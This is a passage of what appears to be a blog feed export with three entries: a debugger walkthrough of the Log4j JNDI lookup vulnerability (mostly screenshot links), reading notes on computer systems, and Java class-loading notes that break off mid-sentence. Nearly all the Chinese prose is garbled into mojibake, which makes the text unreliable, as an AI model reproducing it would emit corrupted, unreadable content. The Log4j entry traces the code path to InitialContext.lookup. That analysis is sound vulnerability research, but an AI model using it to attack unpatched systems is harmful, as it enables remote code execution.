alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å…ˆè¿›å»çœ‹çœ‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c4facdffe086a4b185b4df31b00f32d9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¥½åƒåšäº†å¾ˆå¤šï¼Œåˆå¥½åƒä»€ä¹ˆä¹Ÿæ²¡åšï¼Œå°±æ˜¯setMessageå“ªå„¿æ¢äº†ä¸ªå¯¹è±¡å°è£…messageï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9c674c83442ac5e197f1d9db190fac1f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ„ä¹‰ä¸å¤§ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»§ç»­å•æ­¥æ‰§è¡Œï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0369eb8151f77750a1d36fc269eb7747.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ°è¿™å„¿åè·Ÿè¿›<code>this.log</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/5af6633b2ea10974dae5f3fd0eb3a151.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åè¿›å…¥<code>processLogEvent</code>ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c817be2d6cc1bcaf4b9f3e216de576fa.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ°äº†è¿™å„¿åï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥å•æ­¥å‘ä¸‹ä¼šå‘ç°å¤„ç†å‘ç”Ÿäº†å»¶è¿Ÿï¼Œè¿™å°±æ˜¯æˆ‘ä»¬çš„ä¸»æœºåœ¨è¯·æ±‚dnsè§£æäº§ç”Ÿçš„å»¶è¿Ÿï¼Œæˆ‘ä¹Ÿæ˜¯åœ¨å‘ç°äº†è¿™ä¸ªç‰¹ç‚¹ä¹‹åæ‰èƒ½åœ¨è¿™åˆè‡­åˆé•¿çš„è°ƒç”¨é“¾ä¸­åšæŒåˆ°æœ€åï¼Œç»§ç»­è·Ÿè¿›ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/00286cb7c1ef331c295df7fa35613128.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™å„¿å¾ˆå…³é”®å•Šï¼Œå…„å¼Ÿä»¬ï¼Œä¸ä¿¡æˆ‘ä»¬å¾€ä¸‹çœ‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/82528d1fa8e3932a8ba4b2543307a737.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»§ç»­ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2a77c16aef24c107051f88dd1fd25798.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™å„¿æ˜¯æŒ¨ç€çš„ä¸¤æ¬¡è°ƒç”¨ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0d1cb474302bf5ec825c0722d332e4b5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»§ç»­ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0af7a6a5af6786246a7db5c3bc915d46.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™å„¿ä¸‰é‡å¥—å¨ƒï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f85f1a45d1dbb0ca01e8cb7425fbc5c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>äºŒé‡å¥—å¨ƒï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/acb65f312ca7767ba09307778fc8f515.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆšæ‰è¯´é”™äº†å…„å¼Ÿä»¬ï¼Œå‰é¢ä¸é‡è¦ï¼Œè¿™å„¿å¾ˆé‡è¦å•Šï¼Œè¿™å„¿æœ‰11é‡å¾ªç¯ï¼Œå½“å¾ªç¯åˆ°ç¬¬8å±‚çš„æ—¶å€™ä¼šæœ‰æƒŠå–œï¼Œæ‰€ä»¥æˆ‘ä»¬è‡³ä»Šåˆ°ç¬¬8æ¬¡å¾ªç¯è®©ä½ ä»¬è§è¯†è§è¯†ä»€ä¹ˆä»–ä¹ˆçš„å«ä»–ä¹ˆçš„æƒŠå–œï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a2dcf295b6dbcbcb38531c4b5ad0c9d9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¥½äº†çœ‹åˆ°iç­‰äº8äº†å—ï¼š<br>è·Ÿè¿›å»å’¯ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/22983898aa9728d1ef3af6c3adf236e2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»§ç»­å’¯ï¼Œä¸ç”¨æˆ‘æ•™ä½ å§ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b29b5f9fe7a9a8b2aaa875a07bff652e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>äº²ï¼Œæ•²é»‘æ¿åˆ’é‡ç‚¹äº†å•Šï¼ï¼ï¼ï¼ï¼<br>è¿™é‡Œæœ‰ä¸ªè¿›å…¥çš„å‰ææ¡ä»¶ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0369aa95ff29a7c9fe14bc8aa05010c0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><code>this.config</code>ä¸ä¸ºç©ºï¼Œä¸”<code>this.noLookups</code>ä¸º<code>false</code>,è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä½ åœ¨å„ç§å„æ ·çš„å…¬ä¼—å·çœ‹åˆ°çš„è¯¥æ¼æ´çš„ä¸€ä¸ªè§£å†³æ–¹æ¡ˆå°±æ˜¯å°†<code>noLookups</code>çš„å€¼è®¾ç½®ä¸ºtrueçš„åŸå› ã€‚</p>
<p><code>workingBuiler</code>æ˜¯ä¸ªå•¥ï¼Ÿæˆ‘ä¹Ÿä¸çŸ¥é“å•Šï¼Œæ€ä¹ˆå¯èƒ½ï¼Œè¿™ç©æ„å°±æ˜¯ä¸€ä¸ª<code>stringBuilder</code>ï¼Œæ‰€ä»¥ä½ æ‡‚äº†å§ï¼Ÿ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/52031b353660b11cecfe36d09ce1ee31.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å› ä¸ºä»–å¨˜çš„åœ¨è¿™ä¸ªå£°æ˜è¿‡äº†ï¼Œé‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œé•¿åº¦80ï¼Œä¹Ÿå°±æ˜¯æˆ‘çš„æ—¥å¿—é•¿åº¦ä¸èƒ½è¶…è¿‡80ï¼Ÿæ‰¯æ·¡å‘¢å§ï¼Ÿå½“ç„¶è¶…è¿‡80äº†ï¼Œæä¸æ‡‚æä¸æ‡‚ã€‚<br>è¿›å…¥çš„æ¡ä»¶åˆ¤æ–­æœ‰ä¸€ä¸ªoffsetè°ƒè¯•åå‘ç°æ˜¯59ï¼ŒæŸ¥äº†ä¸€ä¸‹å‘ç°æ˜¯$ï¼Œä¹Ÿå°±æ˜¯è¯´messageå‰é¢çš„58ä¸ªå­—ç¬¦çš„é•¿åº¦æ˜¯å›ºå®šçš„å’¯ï¼Œæˆ‘ä»¬è¾“å…¥çš„ä¿¡æ¯ä»ç¬¬59ä¸ªå¼€å§‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/95d37546a76a8458337d2d73f41c4196.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶ååˆ¤æ–­è¿ç»­ä¸¤ä¸ªå­—ç¬¦æ˜¯æ˜¯å¦ä¸º<code>\$&#123;</code>,å¦‚æœæ˜¯è¿›å…¥æ­£é¢˜ï¼Œæˆªå–äº†ä»59åˆ°åé¢çš„æ‰€æœ‰å­—ç¬¦èµ‹å€¼ç»™<code>value</code>ï¼Œç„¶åç»™æˆ‘ä»¬çš„<code>workingBuilder</code>è®¾ç½®äº†é•¿åº¦å¹¶å°†æˆªå–çš„valueè¿›è¡Œå¤„ç†ä¹‹åèµ‹å€¼ç»™ä»–ï¼Œåœ¨è¿™é‡Œæˆ‘åˆ©ç”¨äº†å‰é¢è¯´åˆ°çš„å»¶æ—¶ç‰¹æ€§è§‚å¯Ÿåˆ°å‘½ä»¤æ‰§è¡Œå°±å‘ç”Ÿåœ¨è¿™é‡Œçš„å¯¹valueå¤„ç†è¿‡ç¨‹ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªå¤„ç†è¿‡ç¨‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/77e72d743f92e20ce96f1ff90ce87a50.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>sourceå°±æ˜¯valueçš„å€¼ï¼Œç»§ç»­è·Ÿè¿›ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1bad77b2aceba1bb205a5a23c2bfab76.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆå¼€å§‹å¥—å¨ƒäº†ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7102cb38abd72eb84a66f10353cf72dc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¸ª<code>substitute</code>å‡½æ•°å¯ä»¥è¯´æ˜¯å†™çš„åˆè‡­åˆé•¿ï¼Œæ€»ç»“ä¸€ä¸‹å·¦å³å°±æ˜¯æå–é‚£ä¸ªå•¥ï¼Ÿå°±é‚£ä¸ªæˆ‘ä»¬çš„payloadå°±å¯¹äº†ï¼Œä¸€ç›´å•æ­¥åˆ°è¿™å„¿ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/777e4b23c5e9cb4f1dbdb1f9a9c8fdd7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å»ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/85de273e4cebfbfdbdaeff7c550bbc55.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ°è¿™å„¿åå…¶å®<code>variableName</code>å°±æ˜¯æˆ‘ä»¬çš„payloadä¸»ä½“äº†ï¼Œç»§ç»­ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0313841f9f36678dd7e4d637817783b1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œæœ‰ä¸¤ä¸ªé‡è¦çš„æ“ä½œï¼Œä¸€ä¸ªæ˜¯è·å¾—äº†åè®®å‰ç¼€ï¼Œä¸€ä¸ªæ˜¯è·å–äº†å…·ä½“çš„paloadå†…å®¹ï¼Œ<code>this.strLookupMap</code>é‡Œé¢å®šä¹‰äº†å¾ˆå¤šæ”¯æŒçš„åè®®ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/cd6baa92469583faac3fc24c6b7b5550.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥è¿›å…¥æ–­ç‚¹ï¼Œåˆ¤æ–­eventæ˜¯å¦ä¸ºç©ºï¼Œè‚¯å®šä¸ä¸ºç©ºå•Šï¼Œæ‰€ä»¥è¿›å…¥çš„æ˜¯<code>lookup.lookup(name)</code>ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2457f1acef53a78931a280628fc472c8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ°äº†è¿™é‡Œå°±æœ‰æ„æ€è€Œäº†ï¼Œç¬¬ä¸€ä¸ªçº¢æ¡†æ˜¯è·å–ä¸€ä¸ª<code>JndiManager</code>ï¼Œä½†æ˜¯åœ¨æˆ‘è°ƒè¯•çš„æ—¶å€™è¿™é‡Œé¢å¥½åƒæ˜¯æŠ¥é”™äº†è¿˜æ˜¯æ€ä¹ˆäº†ï¼Œæ€»æ˜¯è¿›ä¸åˆ°ç¬¬äºŒä¸ªçº¢æ¡†é‡Œé¢ï¼Œè€Œæ‰§è¡Œå‘½ä»¤çš„ä»£ç åˆæ°å¥½åœ¨ç¬¬äºŒä¸ªçº¢æ¡†é‡Œé¢ï¼Œä½ è¯´å¥‡æ€ªä¸å¥‡æ€ªï¼Ÿ<br>æ˜¯æœ‰æ„æˆ‘ç›´æ¥å¼ºè¡Œè·Ÿè¸ªåˆ°äº†ç¬¬äºŒä¸ªçº¢æ¡†é‡Œé¢çš„ä»£ç ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/99a6eb1527f821e09afa691c4f89d85d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‡ä¸­ä¹‹é‡å°±åœ¨è¿™é‡Œäº†å“ˆï¼ï¼ï¼lookupå‡½æ•°ï¼Œçœ‹åˆ°è¿™ä¸ªä½ æƒ³åˆ°äº†ä»€ä¹ˆï¼Ÿä¸ç¡®å®šå—ï¼Ÿé‚£æ¥çœ‹çœ‹<code>this.context</code>æ˜¯ä»€ä¹ˆï¼Œ<code>InitialContext</code>æœ‰æ²¡æœ‰æƒ³èµ·ç‚¹ä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿï¼Ÿ<br>æ‰“å®Œæ”¶å·¥ï¼ï¼ï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>log4j</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿè¯»ä¹¦ç¬”è®°ï¼ˆä¸€ï¼‰</title>
    <url>/archives/84d33ff8.html</url>
    <content><![CDATA[<ul>
<li>ä¸€ä¸ªç¨‹åºä»æ–‡ä»¶åˆ°æ‰§è¡Œè¦ç»è¿‡è¿™äº›è¿‡ç¨‹ï¼š<br>æºç¨‹åºç»è¿‡é¢„å¤„ç†å™¨å°†å£°æ˜çš„å¤´éƒ¨æ–‡ä»¶å¯¼å…¥åˆ°ç¨‹åºä¸­ç”Ÿæˆä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸€èˆ¬ä»¥.iç»“å°¾ï¼Œç„¶åç»è¿‡ç¼–è¯‘å™¨ç¼–è¯‘æˆæ±‡ç¼–ç¨‹åºï¼Œä¸€èˆ¬ä»¥.sç»“å°¾ï¼Œç„¶åç»è¿‡æ±‡ç¼–å™¨ç¿»è¯‘æˆæœºå™¨æŒ‡ä»¤ç”Ÿæˆå¯é‡å®šä½ç›®æ ‡ç¨‹åºï¼Œæ­¤ç¨‹åºæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åç»è¿‡é“¾æ¥å™¨é“¾æ¥ç¨‹åºä¸­ä½¿ç”¨çš„é“¾æ¥åº“å‡½æ•°æœ€ç»ˆç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ï¼Œæœ€ç»ˆè¯¥å¯æ‰§è¡Œæ–‡ä»¶è¢«åŠ è½½åˆ°å†…å­˜ä¸­ç”±ç³»ç»Ÿæ‰§è¡Œã€‚</li>
<li>é€‚é…å™¨ä¸€èˆ¬æ˜¯æ’åœ¨ä¸»æ¿å¡æ§½ä¸­çš„ä¸€å—å¡ï¼Œæ§åˆ¶å™¨ä¸€èˆ¬æ˜¯é›†æˆåœ¨IOè®¾å¤‡ä¸Šçš„æ ¸å¿ƒæ§åˆ¶èŠ¯ç‰‡</li>
<li></li>
<li>è™šæ‹Ÿå†…å­˜ç»“æ„ï¼šæœ€ä¸Šå±‚ç©ºé—´ä¸ºæ“ä½œç³»ç»Ÿå†…æ ¸å†…å­˜ï¼Œå‘ä¸‹ä¾æ¬¡ä¸ºç”¨æˆ·æ ˆã€å…±äº«åº“æ˜ å°„åŒºåŸŸã€è¿è¡Œæ—¶å †ã€ç¨‹åºä»£ç å’Œæ•°æ®ã€‚</li>
<li>å¤šæ ¸è¶…çº¿ç¨‹ï¼šå¤šæ ¸-å¤šä¸ªCPUå†…æ ¸ï¼Œè¶…çº¿ç¨‹ï¼Œå•ä¸ªCPUå†…æ ¸ä¸­èƒ½åŒæ—¶æ‰§è¡Œå¤šä¸ªæ§åˆ¶æµï¼Œåœ¨core i7ä¸­å•æ ¸å¯ä»¥åŒæ—¶æ‰§è¡Œä¸¤ä¸ªæ§åˆ¶æµï¼Œè¿™ä¹Ÿå°±è§£é‡Šäº†æˆ‘çš„ä¸€ä¸ªç–‘æƒ‘ï¼Œå½“åˆåœ¨ç¼–è¯‘linuxå†…æ ¸çš„æ˜¯æœ‰æ‰§è¡Œmake -j number ä¸ºä»€ä¹ˆnumberä¼šæ˜¯ç³»ç»Ÿå†…æ ¸æ•°é‡çš„2å€ï¼ŒåŸæ¥æ ¹æºåœ¨è¿™å„¿ï¼Œæœç„¶çœ‹ä¹¦èƒ½æ›´å¢åŠ äººçš„çŸ¥è¯†é¢ã€‚è¯¥åŠŸèƒ½æ˜¯é€šè¿‡åœ¨å•ä¸ªå†…æ ¸ä¸­å¤‡ä»½æŸäº›ç¡¬ä»¶æ¥å®ç°çš„ï¼Œå¦‚å¤‡ä»½ç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰åŠå¯„å­˜å™¨æ–‡ä»¶ã€‚</li>
<li>æŒ‡ä»¤çº§å¹¶è¡Œï¼Œç°ä»£å¤„ç†å™¨å¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡æŒ‡ä»¤çš„å±æ€§ç§°ä¸ºæŒ‡ä»¤çº§å¹¶è¡Œ</li>
<li>æ—¶é’Ÿå‘¨æœŸï¼Œå®Œæˆä¸€è½®0ã€1åˆ‡æ¢èŠ±è´¹çš„æ—¶é—´ï¼Œä¸Šç½‘æŸ¥çš„ï¼Œä¸ä¸€å®šå‡†ç¡®ã€‚</li>
<li>è¶…æ ‡é‡å¤„ç†å™¨ï¼šä¸€ä¸ªå‘¨æœŸå¯ä»¥æ‰§è¡Œè¶…è¿‡ä¸€æ¡æŒ‡ä»¤çš„å¤„ç†å™¨</li>
<li>æ“ä½œç³»ç»Ÿå†…æ ¸æ˜¯åº”ç”¨ç¨‹åºä¸ç¡¬ä»¶çš„åª’ä»‹ï¼Œå®ƒæä¾›ä¸‰ä¸ªåŸºæœ¬æŠ½è±¡ï¼Œæ–‡ä»¶æ—¶å¯¹ç³»ç»ŸI&#x2F;Oè®¾å¤‡çš„æŠ½è±¡ï¼Œè™šæ‹Ÿå†…å­˜æ˜¯å¯¹ä¸»å­˜å’Œç£ç›˜çš„æŠ½è±¡ï¼Œè¿›ç¨‹æ˜¯å¯¹å¤„ç†å™¨ã€ä¸»å­˜ã€I&#x2F;Oè®¾å¤‡çš„æŠ½è±¡ï¼Œè™šæ‹Ÿæœºæ˜¯å¯¹æ“ä½œç³»ç»Ÿã€å¤„ç†å™¨ã€ä¸»å­˜å’ŒI&#x2F;Oè®¾å¤‡çš„æŠ½è±¡ã€‚</li>
<li>amdahlå®šå¾‹æè¿°äº†å¯¹ç³»ç»ŸæŸä¸€éƒ¨åˆ†è¿›è¡ŒåŠŸèƒ½å‡çº§å¯¹æ•´ä½“æ€§èƒ½çš„å½±å“ã€‚å…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨å¯¹ç³»ç»Ÿçš„æŸä¸ªéƒ¨åˆ†è¿›è¡ŒåŠ é€Ÿæ—¶ï¼Œå…¶å¯¹ç³»ç»Ÿæ•´ä½“æ€§èƒ½çš„å½±å“å–å†³äºç»™éƒ¨åˆ†çš„é‡è¦æ€§ä¸åŠ é€Ÿç¨‹åº¦ã€‚å¦‚æœç³»ç»ŸåŸæ¥çš„è¿è¡Œæ—¶é—´ä¸ºT1ï¼Œå‡è®¾æŸéƒ¨åˆ†æ‰€éœ€çš„æ‰§è¡Œæ—¶é—´å ç³»ç»Ÿè¿è¡Œæ—¶é—´çš„aï¼Œè¿™éƒ¨åˆ†æ€§èƒ½æå‡äº†kå€ï¼Œé‚£ä¹ˆä¸éš¾å¾—å‡ºæ–°ç³»ç»Ÿçš„æ•´ä½“è¿è¡Œæ—¶é—´T2&#x3D;(1-a)T1+(aT1)&#x2F;kï¼ŒåŠ é€Ÿæ—¶é—´æ¯”S&#x3D;T1&#x2F;T2&#x3D;1&#x2F;((1-a)+a&#x2F;k)ã€‚è€ƒè™‘æç«¯çš„æƒ…å†µå½“kæ— é™è¶‹è¿‘äºæ— ç©·å¤§çš„æ—¶å€™S&#x3D;1&#x2F;(1-a)ï¼Œç³»ç»Ÿæ•´ä½“çš„æ€§èƒ½æå‡ç¨‹åº¦å–å†³äºè¯¥éƒ¨åˆ†çš„é‡è¦ç¨‹åº¦ï¼Œè¯¥ç»“è®ºé€šè¿‡ç®€å•çš„æ€è€ƒå…¶å®ä¹Ÿå¹¶ä¸éš¾ä»¥å¾—å‡ºã€‚<br>-å¯¹äºä¸€ä¸ª4å­—èŠ‚è¡¨ç¤ºçš„32ä¸ºæ— ç¬¦å·æ•´æ•°æ¥è¯´ï¼Œå…¶åœ¨å†…å­˜ä¸­çš„å­˜å‚¨å¯é‡‡å–å¤§ç«¯æ³•ä¸å°ç«¯æ³•ä¸¤ç§æ–¹å¼ï¼Œå¤§ç«¯æ³•å³å­—èŠ‚é«˜ä½åœ¨å‰ï¼Œå°ç«¯æ³•å³å­—èŠ‚ä½ä½åœ¨å‰ï¼Œæ¯”å¦‚æ­¤å¤„æœ‰å†…å­˜åœ°å€0x100 0x101 0x102 0x103ï¼Œé‚£ä¹ˆé‡‡ç”¨å¤§ç«¯æ³•å¯¹äºæ•´æ•°0x01234567çš„å­˜å‚¨é¡ºåºä¸º01 23 45 67 å¯¹äºå°ç«¯æ³•å­˜å‚¨é¡ºåºä¸º67 45 23 01ï¼Œå½“ç„¶é‡‡ç”¨å“ªä¸€ç§å­˜å‚¨æ–¹å¼å¾€å¾€æ˜¯æ²¡æœ‰ä»€ä¹ˆå½±å“çš„ï¼Œä½†æ˜¯å½“å¾®å¤„ç†å™¨å›ºå®šä¸‹æ¥åï¼Œæ•°æ®çš„å­˜å‚¨æ–¹å¼ä¹Ÿå°±è¢«å›ºå®šäº†ï¼Œå½“ç„¶ä¹Ÿå­˜åœ¨æœ‰æ”¯æŒåŒç«¯æ³•çš„å¤„ç†å™¨ï¼Œç”±ç”¨æˆ·æ¥é€‰æ‹©ä½¿ç”¨å“ªä¸€ç§å­˜å‚¨é¡ºåºï¼Œå½“ç„¶å…·ä½“é‡‡ç”¨é‚£ç§å­˜å‚¨é¡ºåºè¿˜å–å†³äºæ“ä½œç³»ç»Ÿæ”¯æŒçš„å­˜å‚¨æ–¹å¼ï¼Œä¾‹å¦‚andriodå°±åªæ”¯æŒå°ç«¯çš„å­˜å‚¨é¡ºåºã€‚</li>
</ul>
]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ</tag>
      </tags>
  </entry>
  <entry>
    <title>æµ…å‡ºç†è§£javaç±»åŠ è½½æœºåˆ¶</title>
    <url>/archives/9b259762.html</url>
    <content><![CDATA[<blockquote>
<p>é¢„é˜²é’ˆå…ˆæ‰“ç€ï¼Œè¿™ç¯‡æ–‡ç« æˆ‘å‡†å¤‡æ¬å¤§éƒ¨åˆ†ï¼Œä¸è¦éª‚æˆ‘</p>
</blockquote>
<p>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://blog.csdn.net/javazejian/article/details/73413292">æ·±å…¥ç†è§£Javaç±»åŠ è½½å™¨(ClassLoader)</a><br><a href="https://zhuanlan.zhihu.com/p/25228545">Javaç±»åŠ è½½æœºåˆ¶</a><br><a href="https://www.cnblogs.com/czwbig/p/11127222.html">æ·±å…¥ç†è§£Javaç±»åŠ è½½</a></p>
<h1 id="Classç±»"><a href="#Classç±»" class="headerlink" title="Classç±»"></a>Classç±»</h1><blockquote>
<p>æ²¡æœ‰æ¡ç†ï¼Œåªåšè®°å½• </p>
</blockquote>
<p>Javaç¨‹åºè¿è¡Œæ—¶ï¼Œç³»ç»Ÿä¸€ç›´å¯¹æ‰€æœ‰çš„å¯¹è±¡è¿›è¡Œè¿™æ‰€è°“çš„è¿è¡Œæ—¶ç±»å‹æ ‡è¯†ã€‚è¿™é¡¹ä¿¡æ¯è®°å½•äº†æ¯ä¸ªå¯¹è±¡æ‰€å±çš„ç±»ã€‚è™šæ‹Ÿæœºé€šå¸¸ä½¿ç”¨è¯¥ä¿¡æ¯å»é€‰æ‹©æ­£ç¡®çš„å¯¹è±¡ä¸æ–¹æ³•æ‰§è¡Œï¼Œè€Œç”¨æ¥ä¿å­˜è¿™äº›ç±»å‹ä¿¡æ¯çš„ç±»å°±æ˜¯Classç±»ã€‚Classå°è£…ä¸€ä¸ªå¯¹è±¡å’Œæ¥å£è¿è¡Œæ—¶çš„çŠ¶æ€ï¼Œå½“åŠ è½½ä¸€ä¸ªç±»çš„æ—¶å€™ï¼ŒClassç±»çš„å¯¹è±¡å°±è¢«åˆ›å»ºäº†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªClassç±»çš„å¯¹è±¡å°è£…äº†ä¸€ä¸ªç±»çš„ç±»å‹ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡è¯¥å¯¹è¯¥å¯¹è±¡çš„æ“ä½œæ¥å®ç°å¯¹ç±»çš„æ“ä½œï¼Œè¿™å°±æ˜¯åå°„çš„åŸç†ã€‚<br>æ—¢ç„¶Classç±»çš„å¯¹è±¡å°è£…äº†ä¸€ä¸ªç±»çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯ä¸€èˆ¬åŒ…æ‹¬ç±»åã€å®ç°çš„æ¥å£ã€çˆ¶ç±»ã€æˆå‘˜æ–¹æ³•ã€æˆå‘˜å˜é‡ã€æ³¨è§£ç­‰ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥æ“ä½œè¿™äº›ä¿¡æ¯ã€‚<br>Classç±»çš„æ¯ä¸€ä¸ªå®ä¾‹éƒ½ä»£è¡¨ç€ä¸€ä¸ªè¿è¡Œä¸­çš„ç±»<br>Classç±»æ²¡æœ‰å…¬æœ‰çš„æ„é€ æ–¹æ³•ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€å…¶ä¸èƒ½é€šè¿‡newçš„æ–¹å¼æ¥åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼ŒClassç±»çš„å¯¹è±¡æ˜¯ç”±jvmæ¥åˆ›å»ºçš„ã€‚<br>åŒæ—¶éœ€è¦çŸ¥é“åœ¨JVMä¸­ï¼Œæ¯ä¸ªç±»åªæœ‰å”¯ä¸€çš„ä¸€ä¸ªClasså¯¹è±¡ï¼Œè€Œæ ‡è¯†ä¸€ä¸ªå”¯ä¸€çš„ç±»æ˜¯é€šè¿‡ä»–çš„å®Œå…¨é™å®šåä»¥åŠåŠ è½½ä»–çš„ç±»åŠ è½½å™¨ã€‚åœ¨è¿è¡Œç¨‹åºçš„æ—¶å€™ï¼ŒJVMé¦–å…ˆä¼šåœ¨ç¼“å­˜ä¸­åˆ¤æ–­å½“å‰ç±»æ˜¯ä¸æ˜¯å·²ç»è¢«åŠ è½½äº†ï¼Œä¹Ÿå°±æ˜¯findLoadedClassæ–¹æ³•ã€‚å¦‚æœæ²¡æœ‰åŠ è½½ï¼Œç„¶åä¼šå°†åŠ è½½çš„æƒé™äº¤ç»™å½“å‰ç±»åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨åŠ è½½ï¼Œçˆ¶ç±»åŠ è½½å™¨ä¼šç»§ç»­å‘ä¸Šé€’äº¤åŠ è½½æƒé™ï¼ŒçŸ¥é“æŸä¸€çº§åŠ è½½å™¨çš„çˆ¶ç±»ä¸ºnullä¹‹åï¼Œè¯¥ç±»çš„åŠ è½½æƒé™ä¼šè¢«äº¤ç»™å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œå¯åŠ¨ç±»åŠ è½½å™¨å¦‚æœä¸èƒ½åŠ è½½è¯¥ç±»ï¼Œåˆ™å‘ä¸‹ä¸€æ¬¡æŒ‰ç›¸åçš„é¡ºåºç§»äº¤åŠ è½½æƒé™ï¼Œç›´åˆ°æŸä¸€çº§æˆåŠŸåŠ è½½è¯¥ç±»ï¼Œè¿™å°±æ˜¯javaçš„åŒäº²å§”æ´¾æœºåˆ¶ï¼Œä¸‹é¢æˆ‘ä»¬ä¼šä»ä»£ç å±‚é¢è§‚å¯Ÿè¯¥æœºåˆ¶ã€‚ç±»åŠ è½½å™¨åŠ è½½ç±»æ˜¯é€šè¿‡loadClassæ–¹æ³•å®ç°çš„ã€‚åœ¨loadClassæ–¹æ³•ä¸­ç±»åŠ 